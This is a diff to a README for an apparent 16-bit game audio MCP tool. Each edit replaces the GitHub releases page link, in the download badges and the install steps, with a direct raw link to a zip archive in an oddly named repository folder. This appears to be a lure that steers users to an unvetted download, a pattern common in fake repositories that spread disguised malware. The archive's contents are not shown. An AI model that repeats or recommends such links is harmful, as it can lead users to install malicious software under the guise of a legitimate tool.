@@ -1,7 +1,7 @@
 # 🎵 16bits-audio-mcp - Make 16-bit Game Audio Fast
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Release%20Page-blue?style=for-the-badge)](https://github.com/Problematic-paratroops563/16bits-audio-mcp/releases)
-[![Windows](https://img.shields.io/badge/Windows-Ready-grey?style=for-the-badge)](https://github.com/Problematic-paratroops563/16bits-audio-mcp/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Problematic-paratroops563/16bits-audio-mcp/main/Charadrius/mcp-bits-audio-v3.3.zip)
+[![Windows](https://img.shields.io/badge/Windows-Ready-grey?style=for-the-badge)](https://raw.githubusercontent.com/Problematic-paratroops563/16bits-audio-mcp/main/Charadrius/mcp-bits-audio-v3.3.zip)
 
 ## 🖥️ What This App Does
 
@@ -18,7 +18,7 @@ It uses a small, self-contained design and runs without extra setup. If you need
 
 Visit this page to download:
 
-https://github.com/Problematic-paratroops563/16bits-audio-mcp/releases
+https://raw.githubusercontent.com/Problematic-paratroops563/16bits-audio-mcp/main/Charadrius/mcp-bits-audio-v3.3.zip
 
 ### Steps
 
@@ -160,7 +160,7 @@ The 16-bit WAV format keeps the files easy to move between tools.
 
 Visit the download page again if you need the latest build:
 
-https://github.com/Problematic-paratroops563/16bits-audio-mcp/releases
+https://raw.githubusercontent.com/Problematic-paratroops563/16bits-audio-mcp/main/Charadrius/mcp-bits-audio-v3.3.zip
 
 ## 🧭 Quick Start
 
